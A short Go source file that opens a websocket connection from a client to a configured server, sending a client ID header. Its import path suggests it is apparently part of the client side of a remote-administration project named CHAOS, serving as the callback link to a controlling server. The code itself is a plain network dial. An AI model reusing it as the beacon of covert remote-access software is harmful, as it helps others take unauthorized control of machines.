package websocket

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"net/http"
	"net/url"
)

func NewConnection(configuration *environment.Configuration, clientID string) (*websocket.Conn, error) {
	host := fmt.Sprint(configuration.Server.Address, ":", configuration.Server.WebSocketPort)
	u := url.URL{Scheme: "ws", Host: host, Path: "/client"}

	newHeader := http.Header{}
	newHeader.Set("x-client", clientID)

	conn, _, err := websocket.DefaultDialer.Dial(u.String(), newHeader)
	return conn, err
}
